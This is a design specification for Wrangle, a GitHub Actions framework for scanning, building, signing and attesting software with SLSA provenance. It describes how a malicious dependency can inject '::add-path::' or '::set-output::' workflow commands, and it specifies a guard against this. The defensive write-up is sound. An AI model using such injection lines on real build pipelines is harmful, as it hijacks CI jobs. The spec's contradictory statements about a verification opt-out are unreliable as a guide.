# Wrangle v0.1 Specification

## Vision

Project maintainers should ship features securely without tracking security tooling details. Security engineers should update tools and best practices without bothering maintainers.

Wrangle is a composable CI/CD framework for GitHub Actions that handles the full software development lifecycle — not just security scanning, but also building, testing, publishing, and provenance — using best practices out of the box.

### Core principles

1. **Full lifecycle** — wrangle handles source scanning, building, testing, publishing, SBOM generation, signing, and SLSA provenance. Not just one stage.
2. **One-shot adoption** — a maintainer picks a workflow template matching their project type, gets one or two workflow files, and everything works
3. **Pluggable tools** — new tools are added via adapters without changing adopting repos
4. **Automatic updates** — adopters reference wrangle's reusable workflows; updates flow to everyone
5. **AI-agent friendly** — designed so "Claude, adopt wrangle for this repo" just works

---

## Full Lifecycle

Wrangle covers the entire path from source to published artifact. Each stage has a corresponding reusable workflow that adopters can use independently or together.

### Stages

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Source     │    │   Build     │    │   Publish    │    │   Verify    │
│             │    │             │    │             │    │             │
│ • Vuln scan │───▶│ • Compile   │───▶│ • Push to   │───▶│ • SLSA      │
│ • Workflow  │    │ • Generate  │    │   registry  │    │   provenance│
│   linting   │    │   SBOM      │    │ • Sign with │    │ • Policy    │
│ • Scorecard │    │ • Scan SBOM │    │   Cosign    │    │   check     │
│ • Run tests │    │             │    │             │    │ • VSA       │
│ • SLSA      │    │             │    │             │    │             │
│   source    │    │             │    │             │    │             │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
```

| Stage | What wrangle does | Reusable workflow | Status |
|-------|------------------|-------------------|--------|
| **Source** | Vulnerability scanning (OSV), workflow linting (Zizmor), supply chain scoring (Scorecard), run tests, SLSA source provenance | `check_source_change.yml` (standalone) or the embedded `scan` job of any `build_and_publish_*.yml` | v0.1 |
| **Build** | Compile/build the project, generate SBOM, scan SBOM for vulnerabilities | `build_and_publish_*.yml` | v0.1 (container, python, npm, go) |
| **Publish** | Push artifact to registry, sign with Cosign | `build_and_publish_*.yml` | v0.1 (container, python, npm, go) |
| **Verify** | Generate SLSA L3 build provenance, verify attestations against policy (Ampel) | `build_and_publish_*.yml` / future | v0.1 (provenance), v0.2 (policy) |

Each `build_and_publish_*.yml` embeds the source-scan stage as a `scan` job that runs before the build, so an adopter with a wrangle build type needs only the one build workflow — `check_source_change.yml` is the standalone entry point for repos with no build type.

### What adopters get today (container project example)

With one workflow file (`build_and_publish_container.yml`), a container project gets the source scan **and** the build:

**Source scan (the embedded `scan` job):**
- OSV vulnerability scanning on every PR and push
- Zizmor workflow security linting
- OSSF Scorecard supply chain assessment
- Results in GitHub Security tab via SARIF (requires `security-events: write` from the caller)

**Build (`build_and_publish_container.yml`):**
- Docker image built with Buildx (multi-platform capable, cached)
- SBOM generated automatically (SPDX format)
- SBOM scanned for vulnerabilities before publish
- Image pushed to container registry (ghcr.io)
- Image signed with Cosign (keyless, via Sigstore OIDC — the signature is tied to the GitHub Actions OIDC identity, so verifiers can confirm the image was built by a specific workflow in a specific repo, without managing signing keys)
- SLSA Level 3 provenance attestation via `actions/attest-build-provenance`, run inside wrangle's reusable build workflow (so `builder.id` names that workflow)

This is the "batteries included" experience: the maintainer provides a Dockerfile and wrangle handles everything else.

### Build type extensibility

The `build/actions/` directory is the extensibility point for different project types:

| Build type | Directory | What it does | Status |
|-----------|-----------|-------------|--------|
| Shell | `build/actions/shell/` | Optional setup-script (install test deps), run shellcheck + tests (bats/shunit2), no publishable artifact | v0.1 (wrangle dogfoods this) |
| Container | `build/actions/container/` | Docker build, SBOM, sign, push | v0.1 (exists) |
| Python | `build/actions/python/` | Build wheel/sdist, generate SBOM, publish to PyPI | Future |
| npm | `build/actions/npm/` | Build, generate SBOM, publish to npm registry | Future |
| Go | `build/actions/go/` | Goreleaser-driven binary build, gofmt/vet/test/govulncheck, SBOM, publish to GitHub Releases (wrangle owns publish — no caller-bound OIDC constraint) | v0.2 |
| Generic | `build/actions/generic/` | Run user-defined build command, generate SBOM | Future |

Each build type follows the same pattern:
1. Build the artifact
2. Generate an SBOM describing it
3. Scan the SBOM for vulnerabilities
4. Publish the artifact
5. Sign the artifact
6. Generate SLSA provenance

New build types can be added without changing the source scanning workflow or the adopter's existing setup.

### Build action directory structure

Every build type lives in `build/actions/<type>/` and MUST contain these files. This is the same "everything for one capability lives in one directory" discipline wrangle applies to tools (`tools/<name>/`), extended to build actions:

| File | Purpose | Audience |
|------|---------|----------|
| `action.yml` | The composite action implementation | Runtime |
| `SPEC.md` | Detailed specification: inputs/outputs, step sequence, failure contract, trust model, limitations | Maintainers, reviewers, security auditors |
| `README.md` | User-facing how-to: quick start, copy-pasteable workflow example(s), required permissions, how to verify the output, links into `SPEC.md` for the details | Adopters (humans) and agents generating wrangle integrations |
| `test.bats` | Structural checks (YAML validity, pinned SHAs, required inputs, expected step names). Same pattern wrangle uses for tools (`tools/<name>/test.bats`). | CI |

Action-level behavioral testing — exercising the reusable workflow end-to-end against a real fixture project on real GitHub Actions infrastructure — happens in a dedicated integration-testing companion repo rather than inside this repo. The architecture, security model, and dispatch mechanism are specified in [`test/integration/SPEC.md`](../test/integration/SPEC.md). The short version: a companion repo runs each wrangle reusable workflow against a fixture, dispatched per-PR for internal contributors; fork PRs are excluded by GitHub's default fork-PR secret model.

The reusable workflow that wraps a build action (e.g., `.github/workflows/build_and_publish_container.yml`) is part of the same unit even though it lives outside the directory due to GitHub Actions' reusable-workflow location rules. The directory's `README.md` MUST document both the composite action and the reusable workflow entry points and make clear which one adopters should call.

**Why both SPEC.md *and* README.md?** They serve different audiences and should not be collapsed:

- `SPEC.md` is the contract. It's forward-looking, describes guarantees and failure modes, and exists so maintainers and reviewers can reason about whether the action is correct and whether a change preserves its invariants. It may describe behavior that is still being implemented.
- `README.md` is the how-to. It only describes currently-implemented, stable usage, and is structured so that an adopter (human or agent) can copy a workflow example, wire it into their repo, and verify the output without reading the spec. Agent-generated integrations in particular depend on a canonical, machine-readable usage doc — the README is that doc.

If `SPEC.md` describes behavior that hasn't shipped yet, `README.md` MUST NOT present it as available. Keeping the two in sync during implementation is part of landing a feature, not a follow-up.

### Workflow-command-injection guard for build composites

Every build composite MUST wrap its ecosystem invocations (compile, install, test, lint — anything that runs caller-controlled code or echoes caller-controlled content to the step log) in `lib/stop_commands_guard.sh`. GitHub Actions interprets any line on a step's output stream beginning with `::` as a workflow command (`::add-mask::`, `::add-path::`, `::set-output::`); without the guard a malicious dependency lifecycle hook, test, build backend, or `Dockerfile RUN` can hijack the build job just by printing such a line. See `docs/SLSA_L3_AUDIT.md` Finding 3 for the threat model and `lib/stop_commands_guard.sh` for the two supported wrap shapes (`run` for inline `run:` blocks, `begin` / `end` for `uses:` build steps).

This requirement is enforced by `test/test_build_guard_coverage.bats`, which enumerates every `build/actions/*/action.yml` and fails if a composite has no reference to the guard. A new build type cannot be added without either wiring in the guard or adding the composite to the explicit allowlist in that test (which requires a written rationale — today the list is empty).

The guarded window MUST also cover any post-script logic in the composite's `run:` block that echoes content derived from the build's output (a glob of build artifacts, an error message including filenames, etc.). The pattern is to push that logic INTO the guarded script (writing results to `$GITHUB_OUTPUT`, a file-based channel that stop-commands does not affect) rather than running it in the composite's `run:` block after the guard returns. An unguarded post-script `printf '%s\n' "${tarballs[@]}"` over attacker-influenced filenames is a workflow-command injection path that the guard around the build itself does NOT close.

**Adopter-visible side effect.** GitHub workflow commands intentionally emitted by wrapped build tools — e.g., `printf '::warning::version mismatch\n'` from an npm script, an `::error::` line from a pytest test, an `::notice::` from a `Dockerfile RUN` — are suppressed under the guard: they appear in the step log as plain text rather than surfacing as PR-level annotations. The trade is deliberate (an attacker cannot use a malicious dependency to call `::add-mask::` / `::add-path::` / `::set-output::`); adopters who want PR-level annotations from their build should emit them from a wrangle-controlled step (e.g., the source-scan workflow's SARIF upload) rather than from within their build script.

### Unified metadata layout

Every build type publishes its build outputs to **two complementary places**:

1. **The ecosystem-native location** consumers expect for that build type — PyPI release attestations for python, GHCR image attestations for container, GitHub release assets for Go, etc. This is the wrangle value prop: ecosystem-native consumers use the tools they already know without learning anything wrangle-specific. The ecosystem-native location is a **partial** view: it carries whatever the ecosystem has standardized, which is rarely the full set wrangle generates (e.g., PyPI carries PEP 740 attestations but not SLSA provenance; GHCR carries image attestations but not SBOM scan output).
2. **A consistent unified wrangle location** for cross-ecosystem tooling, policy, and audit. This is the **complete** view: every wrangle build produces the same set of metadata fields here, regardless of build type. A tool spanning multiple ecosystems can read this one schema instead of N. Adopters who need the full picture (compliance audits, policy engines, internal supply-chain dashboards) read the unified location.

Both layers always exist for every build type. They aren't either-or.

The unified location for a build is:

```
metadata/<type>/<shortname>/
├── sbom.spdx.json           # SPDX SBOM (every build type that has dependencies)
├── <type>-<shortname>.intoto.jsonl  # SLSA provenance (filename is namespaced so multiple builds in one workflow don't collide)
├── summary.md               # human-readable build summary
├── scan/
│   ├── osv.sarif            # SBOM vuln scan
│   ├── zizmor.sarif         # action-specific scans where applicable
│   └── ...
└── build-info.json          # type-specific structured metadata (image digest, wheel filenames, etc.)
```

`<type>` is the build type (`container`, `python`, ...) and `<shortname>` is the path-derived name (`/` becomes `_`) so multiple builds in one workflow don't collide.

For npm/go/python the signed provenance bundle is uploaded as a workflow artifact namespaced by build type and shortname (`<type>-provenance-bundle-<shortname>`) so multiple builds in one workflow don't collide — `actions/download-artifact` picks non-deterministically when two artifacts share a name in the same run, and the verify job reading the wrong build's bundle would fail with a confusing subject mismatch. The artifact name is exposed via the workflow's `provenance-artifact-name` output so adopters and downstream consumers don't need to reconstruct the convention themselves. (The container attestation is a registry referrer on the image digest, not a workflow artifact.)

#### How the artifact maps to a directory

GitHub Actions artifacts are zip files. `actions/upload-artifact` zips the configured `path:` and `actions/download-artifact` extracts it back. So when this spec says "the reusable workflow uploads `metadata/<type>/<shortname>/` as the workflow artifact `<type>-metadata-<shortname>`," it means:

- The composite action writes the metadata files into `metadata/<type>/<shortname>/` in the runner's workspace.
- `actions/upload-artifact` zips the contents of that directory and stores the zip on the run as `<type>-metadata-<shortname>`.
- A downstream job calling `actions/download-artifact` with `name: <type>-metadata-<shortname>` and `path: metadata/` extracts the zip back into `metadata/`, recovering the original files at the top level (the type/shortname levels are not preserved inside the zip — the upload's `path:` is the leaf directory by convention).

The reusable workflow exposes the artifact name as the `metadata-artifact-name` output so adopters can `download-artifact` without hardcoding the naming convention. The composite action exposes the workspace-relative path as the `metadata-dir` output for callers that invoke it directly.

Build types use the layout components that apply to them — not every type produces every file. The point is that any tool walking `metadata/<type>/<shortname>/` knows where to look. See #150 for the full rationale and #162 for the directory-layout discussion.

### Shared SBOM vulnerability scanning

Steps 2–3 (generate SBOM, scan for vulnerabilities) apply to every build type that produces an artifact. How the SBOM is *generated* varies by build type (BuildKit for containers, language-specific tooling for Python/npm/Go), but how it is *scanned* does not — all SBOMs are scanned the same way using `osv-scanner`.

SBOM scanning is shared infrastructure, not per-build-type logic. All build types use a common scanning implementation (e.g., `lib/scan_sbom.sh`) rather than reimplementing scanning in each build action. This ensures consistent behavior: same tool, same SARIF output format, same non-blocking policy across all artifact types.

### Test integration

Wrangle doesn't replace your test framework — it orchestrates it. Tests run in **two places**:

1. **Source stage (on every PR):** The source workflow detects and runs the project's test command. This gives fast feedback on PRs before any build or publish step. Tests here use the shell/script build type adapter for detection.
2. **Build stage (on merge/tag):** Tests run again as part of the build, ensuring the artifact being published passes all checks.

Test detection by project type:
- **Shell projects:** `bats` tests, `make test`, or shellcheck
- **Container projects:** Tests run during `docker build` (multi-stage builds) or as a pre-build step
- **Future build types:** `pytest`, `npm test`, `go test`, etc.

If tests fail at either stage, the pipeline stops. No artifact is built or published from untested code.

### Build stage failure contract

The build stage has multiple failure points with different behaviors:

| Failure | Behavior | Rationale |
|---------|----------|-----------|
| **Source scan finds a load-bearing (`:fail`) issue** | Publish is blocked (see the per-build-type gating points below). SARIF still uploaded. | The embedded `scan` job is a gate, not just a report — a known-bad source state should not ship. This is the *source* scan and is distinct from the SBOM vulnerability scan below, which is informational. Tools suffixed `:info` (Scorecard by default) never block. |
| **Tests fail** | Pipeline stops. No artifact built or published. | Broken code should never be released. |
| **Build fails** | Pipeline stops. | Nothing to publish. |
| **SBOM generation fails** | Pipeline stops. | Can't verify what's in the artifact without an SBOM. |
| **SBOM vulnerability scan finds issues** | Build continues. SARIF uploaded to Security tab. Findings visible but non-blocking. | Vulnerabilities in dependencies are informational — maintainers need to see them but shouldn't be blocked from shipping. Blocking on transitive dependency vulns creates alert fatigue and is often unactionable. |
| **Cosign signing fails** | Pipeline stops. Unsigned artifact is NOT published. | An unsigned artifact missing an expected security guarantee is indistinguishable from a supply chain attack. Publishing it trains users to accept unsigned artifacts, which is exactly the condition an attacker needs. |
| **SLSA provenance generation fails** | Pipeline stops. Artifact is NOT published without provenance. | Same reasoning — if adopters expect provenance and it's suddenly missing, that's either an attack or a broken release. Either way, don't ship it. "Oh sure, USUALLY this has provenance, but there was a problem" is the social engineering vector for supply chain attacks. |

This "fail on anything that weakens security guarantees" approach is stricter than the typical "warn on infra" pattern, but wrangle is a security tool — its releases must model the behavior it advocates. If Sigstore/Fulcio is down, the correct response is to wait and retry, not to ship without signing.

### Release-events gating

Every wrangle build-type reusable workflow MUST expose a `release-events` input that controls whether release-time side effects (SLSA provenance generation; in some build types, publish) run for a given event. The default is `non-pull-request`. Internally the workflow MUST delegate the decision to the shared composite action `actions/release_gate/`, which exposes a `should-release` output. The reusable workflow then:

1. Gates its own provenance job on `needs.gate.outputs.should-release == 'true'`.
2. Re-exports `should-release` as a workflow output so the caller's publish job (when one exists) can gate on the same value — keeping wrangle's internal gating and the caller's downstream gating in lockstep.

Supported `release-events` shorthands:

- `non-pull-request` (default) — every event except `pull_request*`.
- `tag-only` — push to `refs/tags/*` only.
- `main-and-tags` — push to `refs/heads/main` or `refs/tags/*`.
- A comma-separated list of `github.event_name` values (e.g., `push,workflow_dispatch`) for adopters who need exact control. The list matches purely on event name; ref filtering is only available through the shorthands above.

Why a shared composite. Centralizing the predicate means adopters get a single vocabulary across every build type, and refining the gate (adding a shorthand, supporting environments, applying ref filters to event lists) is a single-PR change rather than a sweep across every reusable workflow.

Why over-generation is acceptable for the default. SLSA L3 provenance is non-falsifiable: a verifier checks `--source-uri` and (where the consumer specifies it) `--source-tag` against the provenance's recorded `workflow_ref`. A `schedule`-cron run that nobody downstream consumes is harmless because no consumer references that `workflow_ref`. The cost of over-generation is generator-job runtime; the cost of under-generation is "the consumer expected provenance and didn't get it." Asymmetric — over-generate by default, let adopters tighten when they have a stronger threat model (e.g., `tag-only` to ensure unauthorized `workflow_dispatch` cannot mint provenance for a release that downstream verifiers might trust under a default policy).

Asymmetry: container vs. python. The container reusable workflow's docker push happens mid-composite inside `build/actions/container`; `release-events` currently gates the attest and verify jobs in that workflow, not the push. The python reusable workflow has no publish step (PyPI Trusted Publishing's OIDC constraint means publish lives in the caller), so `release-events` gates the attest and verify jobs, and `should-release` flows out to the caller's publish job. Build types MUST document this scope when their publish path differs from the python pattern.

### Source-scan gating

Contract introduced in [#334](https://github.com/TomHennen/wrangle/issues/334). Every `build_and_publish_*.yml` runs the embedded `scan` job (`actions/scan`) before building, controlled by a `scan-tools` input (default `"osv zizmor scorecard:info dependency-review"`; `:info`-suffixed tools are non-blocking; empty string disables the scan). A load-bearing (`:fail`) scan finding blocks publishing — but, like `release-events`, *where* it blocks tracks each build type's publish path, because that path is what must be prevented:

- **container** — the `build` job `needs: [scan]`, so a finding blocks the build (and therefore the mid-composite push) on **every** event, not only release events. This is the documented exception, mirroring the `release-events` container asymmetry above: the push is mid-composite and not release-gated, so the scan gate cannot defer to release time either.
- **go** — the scan gates the `release` job on release events; PR snapshot builds still run, consistent with the `release-events` model.
- **python / npm** — a finding fails the run, so the caller's `needs:`-gated publish job is skipped (same propagation as a failed verify).
- **shell** — a finding fails the run; there is no publishable artifact to gate.

Which tools actually gate a release depends on the event: `actions/scan` runs `dependency-review` only on `pull_request` and `scorecard` only on push, so at release time (a tag push) the effective blocking tools from the default `scan-tools` are `osv` and `zizmor`. `dependency-review` gates at PR-review time; `scorecard` is `:info` (non-blocking) by default.

The embedded `scan` job requests `actions: read` + `contents: read` + `security-events: write`. A build caller MUST grant `actions: read` and `security-events: write` on top of its build permissions: GitHub fails a reusable-workflow run at startup (a hard `startup_failure`, not a silent downgrade) if a called job requests a permission the caller did not grant. The example callers grant both; adopters upgrading an existing caller MUST add them.

### Release verification

Every wrangle build-type reusable workflow verifies its provenance before declaring success — there is no opt-out: a wrangle release is verified by construction. Verification is the `verify` job (`actions/verify` → ampel), gated on `should-release`:

1. ampel collects the just-produced provenance — the attest job's signed bundle for npm/go/python (passed as a workflow artifact), or the image's OCI 1.1 referrer for container — and evaluates it against the build type's `wrangle-provenance-<type>-v1` PolicySet.
2. It is fail-closed on the signer identity: the PolicySet's `common.identities` admits only wrangle's reusable build workflow (`build_and_publish_<type>.yml`) as the keyless signer — no `--signer` flag to forget — and also checks the SLSA builder/buildType/build-point tenets. The bats harness proves each PolicySet rejects an unsigned or wrong-signer attestation.
3. A FAILED verdict fails the workflow; standard `needs:` propagation then blocks any caller's release-time job (e.g., python publish, container release tagging). This closes the "tampered between build and publish" window — the build provenance only covers what wrangle built, not what the registry serves on subsequent reads. For container, ampel pulls the provenance from the registry by digest, so the verdict also covers the registry round-trip.
4. On a PASS, the same job emits the single signed VSA a consumer trusts — so verification and the consumer artifact are one step, and the wrangle signer identity is declared once (in the PolicySet) rather than duplicated in a separate verify flag.

Why no opt-out. Verification is the point of wrangle's "build → release" contract; a release that skipped it would still emit a signed VSA consumers trust, with nothing behind it. Because the `verify` job is gated on `should-release`, PR/dev builds produce no VSA at all — there is no green-looking VSA on an unverified build to mislead a consumer.

Why opt-out exists. Some adopters run custom verification policies (different `--source-uri` constraints, custom cert identities, ratchet-style multi-tag-tolerance). For those cases the opt-out lets them keep wrangle's build/provenance/attestation while replacing the verify step. The contract becomes: wrangle still pushes/builds/attests, but the integrity-between-build-and-publish guarantee shifts to the adopter.

### Consumer VSA verification

The signed VSA (`predicateType: https://slsa.dev/verification_summary/v1`) is the consumer trust boundary: a consumer trusts that one signed attestation instead of re-running the policy engine. For npm/go/python the supported check is **`cosign verify-blob-attestation` + a `jq` predicate-field check**: it binds the signer identity (wrangle's reusable workflow), the **origin repository** (`--certificate-github-workflow-repository`), and the artifact hash, with the `jq` decode covering the predicate fields. A one-command `ampel verify` against the wrangle-hosted `policies/wrangle-vsa-consumer-v1.hjson` PolicySet is **not recommended yet** — ampel (v1.2.1) matches only the cert's issuer + SAN, not the source-repository extension, so it cannot bind the origin repo ([#321](https://github.com/TomHennen/wrangle/issues/321)); it may return once that's fixed. Containers are a separate case: the VSA subject is an image digest with no file blob for `cosign verify-blob-attestation`, so the consumer uses `cosign verify-attestation` against the image. The container VSA is an OCI 1.1 referrer (not the `.att`-tag SLSA provenance), and `cosign verify-attestation` (cosign v3) reads it and binds the origin repository via `--certificate-github-workflow-repository`; the integration suite's `verify-container-vsa` job is the regression backstop. `slsa-verifier verify-vsa` is **not** usable: it requires `--public-key-path` and verifies only key-signed VSAs, while wrangle's are keyless (Fulcio/Sigstore). Per-build-type commands live in each `build/actions/<type>/README.md`.

The verifiable identity is the VSA's **signing certificate — wrangle's reusable workflow** (`build_and_publish_<type>.yml`); the provenance's `builder.id` now names that same workflow (below), and `verifier.id` (`https://carabiner.dev/ampel@v1`, the engine) is hard-coded and not wrangle. So consumers pin wrangle's workflow path as the cert identity and pass their own repo via `--certificate-github-workflow-repository` — the cosign path above; the one-command ampel path cannot bind the repo (it matches only issuer + SAN), per [#321](https://github.com/TomHennen/wrangle/issues/321).

**Build-vs-provenance-creation identity (closed, [#316](https://github.com/TomHennen/wrangle/issues/316)).** wrangle's reusable workflow runs the real build (`npm pack`, `goreleaser`, `python -m build`, `docker build`) AND produces the provenance, via `actions/attest-build-provenance` run *inside* that workflow. Because the attest step runs in the reusable workflow, its `job_workflow_ref` becomes both the Sigstore signing-certificate SAN and the provenance `builder.id` — so `builder.id` now names *which workflow built the artifact* (`build_and_publish_<type>.yml`), not a generic prov-signer. This closes the former gap where the *generic* slsa-github-generator only signed the provenance: a different or compromised workflow in the same repo could have fed its own hashes to the generic generator and obtained passing provenance. Running the attest step inside the reusable workflow is also what preserves SLSA Build **L3** — the reusable workflow is the isolated, trusted build platform. (Historically this was a documented gap; the slsa-github-generator path has since been removed.)

### Build Track level

Every wrangle build-type reusable workflow that produces provenance — `build_and_publish_npm.yml` (npm and pnpm), `build_and_publish_python.yml` (pip and uv), `build_and_publish_container.yml`, and `build_and_publish_go.yml` — meets **SLSA v1.2 Build L3**. `build_shell.yml` produces no artifact and no provenance, so no Build Track level applies to it.

Wrangle's user-facing docs claim exactly **one** Build Track level per workflow — Build L2 or Build L3 — and never a finer-grained, requirement-by-requirement breakdown. An adopter should not have to reason about individual SLSA L3 requirements ("Provenance is Unforgeable" versus "Isolated") to know what a workflow delivers; the single Build Track level is the claim. The full per-builder analysis behind the L3 verdicts is [`docs/SLSA_L3_AUDIT.md`](SLSA_L3_AUDIT.md).

Two conditions narrow every Build L3 claim:

- **Reusable consumption only.** The verdict assumes the adopter consumes wrangle through one of wrangle's reusable workflows. Calling a `build/actions/<type>` composite directly from an adopter-authored job forfeits the build-vs-sign job separation and is **not** a supported L3 path.
- **GitHub-hosted runners only.** Self-hosted runners invalidate the ephemeral-build-environment assumption the L3 verdicts depend on.

**Cache isolation is part of the L3 claim.** SLSA v1.2's "Isolated" requirement states the output of a build MUST be identical whether or not a cache is used. Three of wrangle's cache surfaces — the container path's BuildKit `type=gha` cache, the python-uv sub-path's uv cache, and the Go path's `actions/setup-go` module + build caches — are shared cross-build via GitHub's cache service and are not re-verified on cache hits in a way that defeats a cache-scope attacker, so a release build must not consume them. Each of those three workflows gates its build cache on the same `should-release` signal that gates provenance: release builds (`should-release == 'true'`) build cache-free; PR builds keep caching for fast iteration, since they produce no attested artifact. The npm sub-path keeps its cache in both contexts because `npm ci` re-verifies every cached tarball against the lockfile on install; the pnpm sub-path and the python-pip sub-path consume no cross-build cache at all. See [`docs/SLSA_L3_AUDIT.md`](SLSA_L3_AUDIT.md) Findings 1 and 2 and its "Release-vs-PR build asymmetry" section.

## Architecture

### Layers

```
┌──────────────────────────────────────────────────┐
│  Adopting Repo                                   │
│  .github/workflows/check_source_change.yml       │
│  (calls wrangle's reusable workflow)             │
└──────────────────┬───────────────────────────────┘
                   │ uses:
┌──────────────────▼───────────────────────────────┐
│  Wrangle Reusable Workflow                       │
│  .github/workflows/check_source_change.yml       │
│  (orchestrates composite actions)                │
└──────────────────┬───────────────────────────────┘
                   │ uses:
┌──────────────────▼───────────────────────────────┐
│  Wrangle Composite Action                        │
│  actions/scan/action.yml                         │
│  (installs tools, runs adapters, uploads results)│
└──────────────────┬───────────────────────────────┘
                   │ calls
┌──────────────────▼───────────────────────────────┐
│  Orchestrator + Tools                            │
│  run.sh → tools/<name>/install.sh                │
│         → tools/<name>/adapter.sh                │
│  (download binaries, run tools, normalize output)│
└──────────────────────────────────────────────────┘
```

This diagram traces the standalone scan path. Each `build_and_publish_*.yml` reuses the same lower layers from a `scan` job, embedding `actions/scan` ahead of its build jobs (see Source-scan gating).

### Directory Layout

```
wrangle/
├── tools/                  # One directory per tool — everything in one place
│   ├── osv/
│   │   ├── install.sh      # Downloads + verifies OSV-Scanner binary
│   │   ├── adapter.sh      # Runs OSV-Scanner, produces SARIF
│   │   └── test.bats       # Tests for this tool
│   └── zizmor/
│       ├── install.sh
│       ├── adapter.sh
│       └── test.bats
├── lib/                    # Shared helpers
│   ├── download_verify.sh  # wrangle_download_verify(), wrangle_verify_provenance()
│   ├── format_sarif_summary.sh  # SARIF → markdown summary (with sarif_to_md.sh fallback)
│   ├── log_findings.sh     # Per-finding CI log lines (issue #158)
│   ├── sanitize.sh         # wrangle_sanitize_output() — shared HTML stripping + truncation
│   ├── sarif_to_md.sh      # SARIF → human-readable markdown (per-tool)
│   └── tool_banner.sh      # Print visual banner for tool log attribution
├── actions/                # GitHub Actions entry points
│   ├── scan/
│   │   └── action.yml      # Composite action: scan source code
│   └── scorecard/
│       └── action.yml      # OSSF Scorecard wrapper (GitHub Action, not adapter)
├── build/                  # Build/publish workflows
│   └── actions/
│       └── container/
│           └── action.yml  # Container build/publish action
├── run.sh                  # Orchestrator (installs + runs tools)
├── gh_workflow_examples/   # Copy-paste templates for adopters
├── test/                   # Integration tests, fixtures, schemas
├── docs/
│   └── SPEC.md             # This document
└── AGENTS.md               # AI agent adoption instructions
```

**Why per-tool directories?** Everything related to a single capability lives in one place. To understand "what does wrangle's OSV integration entail?" — look in `tools/osv/`. To add a new tool — copy any `tools/<name>/` directory and adapt. This makes the project easy to navigate and extend.

**Note on root layout:** `run.sh` and `AGENTS.md` live at the repo root for discoverability. If the repo grows and the root gets noisy, `run.sh` could move into a `src/` directory (updating the `../../` path constraint in the composite action accordingly).

**`build/actions/` extensibility:** The `build/actions/container/` directory is the first build type. Future build types (e.g., `build/actions/python/`, `build/actions/npm/`) follow the same pattern, providing opinionated build+publish workflows for different project types.

---

## Tool Adapter API

### Adapter Script Interface

Each tool directory contains an `adapter.sh` that wraps the tool with a standard interface.

**Contract:**

```
LOCATION: tools/<name>/adapter.sh

USAGE:  adapter.sh <src_dir> <output_dir>

ARGUMENTS:
  src_dir     Path to the source code to scan (read-only)
  output_dir  Path to write results (writable, already exists)

OUTPUT FILES (written to output_dir):
  output.sarif   REQUIRED  SARIF 2.1.0 JSON
  output.md      OPTIONAL  Human-readable markdown summary
  output.txt     OPTIONAL  Human-readable plain text (fallback if no .md)

  If the adapter does not produce output.md or output.txt, the
  orchestrator generates output.md from output.sarif via
  lib/sarif_to_md.sh. Adapters that produce richer tool-specific
  output should write their own output.md to prevent this fallback.

EXIT CODES:
  0  Scan completed, no findings
  1  Scan completed, findings detected
  2  Scan failed (tool error)

PRECONDITIONS:
  Tool binary is on $PATH (handled by install script)
  jq is available

ENVIRONMENT:
  Adapters run with a restricted environment. Only the following variables
  are passed through from the runner:
    PATH, HOME, TMPDIR, RUNNER_TEMP, GITHUB_WORKSPACE, GITHUB_STEP_SUMMARY
  Sensitive variables (GITHUB_TOKEN, ACTIONS_RUNTIME_TOKEN, etc.) are NOT
  available to adapters by default. If a tool requires an additional
  environment variable (e.g., a private vulnerability DB token), it can
  be passed through by setting it in the composite action's `env:` block
  with a `WRANGLE_EXTRA_` prefix. The orchestrator forwards any variable
  matching `WRANGLE_EXTRA_*` to adapters with the prefix stripped.
  Example: `WRANGLE_EXTRA_OSV_DB_TOKEN=xxx` becomes `OSV_DB_TOKEN=xxx`
  in the adapter environment. This keeps the allowlist explicit without
  requiring adapter forks for authenticated tools.

SECURITY:
  - Adapter scripts MUST NOT write files outside of output_dir.
    The orchestrator performs a post-execution filesystem check to detect
    unexpected modifications outside output_dir and flags violations.
  - Adapter scripts MUST NOT make network requests beyond what the tool
    requires for its scan (e.g., fetching vulnerability databases)
  - All output written to GITHUB_STEP_SUMMARY MUST be sanitized to
    prevent markdown/HTML injection
  - jq exit codes MUST be checked; malformed SARIF must not silently pass
```

### Install Script Interface

Each tool directory contains an `install.sh` that downloads and verifies the tool binary. Install scripts are called by the orchestrator (`run.sh`), not by users directly.

**Contract:**

```
LOCATION: tools/<name>/install.sh

USAGE:  install.sh [version]

ARGUMENTS:
  version  Optional. Pinned version to install. Defaults to a known-good version
           hardcoded in the script.

BEHAVIOR:
  1. Check if correct version is already installed; exit 0 if so
  2. Detect OS (linux/darwin) and arch (amd64/arm64)
  3. Download binary over HTTPS from tool's official release page
  4. Verify integrity (see "Integrity Verification" below)
  5. Place binary in $WRANGLE_BIN_DIR (default: $RUNNER_TEMP/.wrangle/bin)
  6. Print installed version to stdout

EXIT CODES:
  0  Installed successfully (or already present)
  1  Installation failed (download error, checksum mismatch, etc.)

INTEGRITY VERIFICATION (mandatory):
  Every install script MUST verify the downloaded binary before placing it
  on PATH. The three methods below (SLSA / Sigstore / SHA-256) apply to
  install-script-pattern tools — those that download a standalone binary
  artifact via lib/download_verify.sh. Go-module tools fetched via
  `go install <module>@<version>` are covered by the separate fourth tier
  ("GO MODULES" below), which routes integrity through sum.golang.org
  instead of lib/download_verify.sh; see CLAUDE.md §"Supply Chain
  Discipline" for the gating conditions. The scan action installs
  slsa-verifier via the official
  slsa-framework/slsa-verifier/actions/installer action.

  Verification method (chosen per tool at development time, not at runtime):

    Each tool's install script uses exactly ONE verification method,
    chosen at development time based on what the upstream tool publishes.
    There is NO runtime fallback between methods. If the chosen method
    fails, the install MUST fail — a verification failure may indicate a
    supply chain attack, and falling back to a weaker method would defeat
    the purpose of the stronger one.

    The methods, in order of preference:
    1. SLSA provenance verification — if the tool publishes SLSA
       attestations, the install script verifies them via slsa-verifier.
       This proves the binary was built from specific source by a specific
       builder. Provenance verification is sufficient on its own — the
       provenance attestation covers the artifact's identity and integrity,
       so an additional checksum is not required. This simplifies wrangle
       integration for tools with SLSA support.
    2. Sigstore signature verification — if the tool signs releases with
       Cosign/Sigstore but does not publish full SLSA attestations, the
       install script verifies the signature. If signature verification
       fails, the install MUST abort.
    3. SHA-256 checksum — if neither SLSA provenance nor Sigstore
       signatures are available, verify against a checksum hardcoded in
       the install script itself (NOT downloaded alongside the binary).
       Each version bump requires updating the pinned checksum.

    CRITICAL: There is no fallback. A tool configured for SLSA provenance
    MUST NOT silently continue with only checksum verification if
    provenance verification fails. A failed verification of any kind is
    an error, not a reason to try something weaker.

  Tools with SLSA provenance: OSV-Scanner
  Tools with Sigstore signatures: (to be determined per tool)
  Tools with checksum only: Zizmor

  GO MODULES (`go install`) — narrow fourth tier:

